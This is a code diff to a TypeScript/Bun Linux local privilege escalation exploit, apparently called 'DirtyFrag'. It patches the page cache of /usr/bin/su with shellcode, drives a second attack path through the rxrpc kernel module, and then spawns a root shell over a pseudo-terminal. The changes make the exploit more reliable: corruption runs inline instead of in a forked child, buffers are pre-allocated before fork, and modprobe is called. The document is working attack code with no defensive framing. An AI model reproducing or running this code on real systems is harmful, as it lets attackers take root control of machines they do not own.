@@ -922,39 +922,28 @@ export function suLpeMain(argv: string[]): number {
   }
   if (getEnv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
 
-  progress("suLpeMain: forking corruption child...");
-  const cpid = C.fork() as number;
-  if (cpid < 0) {
-    progress("suLpeMain: fork failed");
+  // Bun uses a multithreaded JS engine (JSC). fork() via FFI leaves the child
+  // with dead GC/JIT threads and a broken heap — the first Bun runtime call
+  // (e.g. process.stdout.write) triggers a JSC assertion → SIGILL (status 0x84).
+  // Fix: run corruptSu() inline in the main process instead of forking.
+  // The unshare(CLONE_NEWUSER|CLONE_NEWNET) will affect the current process,
+  // which is acceptable for a standalone exploit.
+  progress("suLpeMain: running corruptSu() inline (no fork — Bun JSC fork limitation)");
+  const rc = corruptSu();
+  if (rc !== 0) {
+    progress(`suLpeMain: corruptSu FAILED rc=${rc}`);
     return 1;
   }
 
-  if (cpid === 0) {
-    const rc = corruptSu();
-    C._exit(rc === 0 ? 0 : 2);
-  }
-
-  progress(`suLpeMain: waiting for child pid=${cpid}...`);
-  const cstatus = Buffer.alloc(4, 0);
-  C.waitpid(cpid, ptr(cstatus), 0);
-  const st = cstatus.readInt32LE(0);
-  if (!WIFEXITED(st) || WEXITSTATUS(st) !== 0) {
-    progress(`suLpeMain: child failed (status=0x${st.toString(16)})`);
-    return 1;
-  }
-  progress("suLpeMain: child exited OK, verifying patch...");
-
-  // Verify: first two bytes of shellcode entry (0x31 0xff = xor edi,edi)
+  progress("suLpeMain: verifying patch...");
   if (
     verifyByte(TARGET_PATH, ENTRY_OFFSET, 0x31) !== 0 ||
     verifyByte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) !== 0
   ) {
-    SLOG("post-write verify failed (target unchanged)");
+    progress("suLpeMain: post-write verify FAILED (target unchanged)");
     return 1;
   }
-  SLOG(
-    `/usr/bin/su page-cache patched (entry 0x${ENTRY_OFFSET.toString(16)} = shellcode)`,
-  );
+  progress(`suLpeMain: /usr/bin/su page-cache patched at entry 0x${ENTRY_OFFSET.toString(16)}`);
   return 0;
 }
 
@@ -2083,6 +2072,16 @@ function runRootPty(): number {
   if ((C.ioctl(STDIN_FILENO, TIOCGWINSZ, ptr(ws)) as number) === 0)
     C.ioctl(master, TIOCSWINSZ, ptr(ws));
 
+  // Pre-allocate every buffer the child will need BEFORE fork().
+  // After fork() only the calling thread survives; any JS allocation in the
+  // child (Buffer.from, cstr, etc.) can trigger JSC GC on a dead thread → SIGILL.
+  const slaveNameBuf = cstr(slaveName);
+  const ioctlBuf     = Buffer.alloc(4, 0);   // dummy arg for TIOCSCTTY
+  // execSuLogin paths — pre-built cstr buffers for each candidate
+  const suPaths = ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]
+    .map(p => ({ path: cstr(p), arg0: cstr("su"), arg1: cstr("-") }));
+  const suFallback = { path: cstr("su"), arg0: cstr("su"), arg1: cstr("-") };
+
   const pid = C.fork() as number;
   if (pid < 0) {
     C.close(master);
@@ -2090,17 +2089,17 @@ function runRootPty(): number {
   }
 
   if (pid === 0) {
-    // child: open slave, become session leader, exec su
+    // child: only raw FFI calls — no JS allocations allowed
     C.setsid();
-    const slave = openFd(slaveName, O_RDWR, 0) as number;
+    const slave = _openFFI(slaveNameBuf, O_RDWR, 0) as number;
     if (slave < 0) C._exit(127);
-    C.ioctl(slave, TIOCSCTTY, Buffer.alloc(4));
-    C.dup2(slave, 0);
-    C.dup2(slave, 1);
-    C.dup2(slave, 2);
+    C.ioctl(slave, TIOCSCTTY, ioctlBuf);
+    C.dup2(slave, 0); C.dup2(slave, 1); C.dup2(slave, 2);
     if (slave > 2) C.close(slave);
     C.close(master);
-    execSuLogin();
+    for (const { path, arg0, arg1 } of suPaths)
+      C.execl(path, arg0, arg1, null);
+    C.execlp(suFallback.path, suFallback.arg0, suFallback.arg1, null, null);
     C._exit(127);
   }
 
@@ -2206,14 +2205,24 @@ export function rxrpcLpeMain(argv: string[]): number {
     }
   }
 
-  // autoload rxrpc module via dummy socket
+  // Try to load rxrpc kernel module, then probe with a dummy socket.
   {
+    progress("rxrpc: attempting modprobe rxrpc...");
+    const mp = Bun.spawnSync(["modprobe", "rxrpc"]);
+    if (mp.exitCode !== 0) {
+      progress(`rxrpc: modprobe failed (exit=${mp.exitCode}) — module may be built-in or unavailable`);
+    } else {
+      progress("rxrpc: modprobe rxrpc OK");
+    }
+
     const dummy = C.socket(AF_RXRPC, SOCK_DGRAM, PF_RXRPC) as number;
     if (dummy < 0) {
+      progress(`rxrpc: socket(AF_RXRPC) failed: ${errStr()} — kernel has no rxrpc support, cannot continue`);
       WARN(`socket(AF_RXRPC): ${errStr()} — module not loadable?`);
       return 1;
     }
     C.close(dummy);
+    progress("rxrpc: module loaded, dummy socket OK");
     LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
   }
 
@@ -2452,19 +2461,16 @@ export function rxrpcLpeMain(argv: string[]): number {
     if ((C.pipe(ptr(pFds)) as number) === 0) {
       const pr = pFds.readInt32LE(0),
         pw = pFds.readInt32LE(4);
+      // Pre-allocate before fork — no JS alloc in child
+      const _ge0 = cstr("getent"), _ge1 = cstr("getent");
+      const _pa  = cstr("passwd"), _ro  = cstr("root");
       const gpid = C.fork() as number;
       if (gpid === 0) {
         C.close(pr);
         C.dup2(pw, 1);
         C.dup2(pw, 2);
         C.close(pw);
-        C.execlp(
-          cstr("getent"),
-          cstr("getent"),
-          cstr("passwd"),
-          cstr("root"),
-          null,
-        );
+        C.execlp(_ge0, _ge1, _pa, _ro, null);
         C._exit(127);
       }
       C.close(pw);
@@ -2517,6 +2523,12 @@ function rxrpcLpePty(): number {
   if ((C.ioctl(STDIN_FILENO, TIOCGWINSZ, ptr(ws)) as number) === 0)
     C.ioctl(master, TIOCSWINSZ, ptr(ws));
 
+  // Pre-allocate all child buffers before fork (avoid JS alloc after fork)
+  const _slaveBuf  = cstr(slaveName);
+  const _ioctlBuf  = Buffer.alloc(4, 0);
+  const _suFile    = cstr("su");
+  const _suArg0    = cstr("su");
+
   const pid = C.fork() as number;
   if (pid < 0) {
     WARN(`fork: ${errStr()}`);
@@ -2524,15 +2536,13 @@ function rxrpcLpePty(): number {
   }
   if (pid === 0) {
     C.setsid();
-    const slave = openFd(slaveName, O_RDWR, 0) as number;
+    const slave = _openFFI(_slaveBuf, O_RDWR, 0) as number;
     if (slave < 0) C._exit(127);
-    C.ioctl(slave, TIOCSCTTY, Buffer.alloc(4));
-    C.dup2(slave, 0);
-    C.dup2(slave, 1);
-    C.dup2(slave, 2);
+    C.ioctl(slave, TIOCSCTTY, _ioctlBuf);
+    C.dup2(slave, 0); C.dup2(slave, 1); C.dup2(slave, 2);
     if (slave > 2) C.close(slave);
     C.close(master);
-    C.execlp(cstr("su"), cstr("su"), null, null, null);
+    C.execlp(_suFile, _suArg0, null, null, null);
     C._exit(127);
   }
 
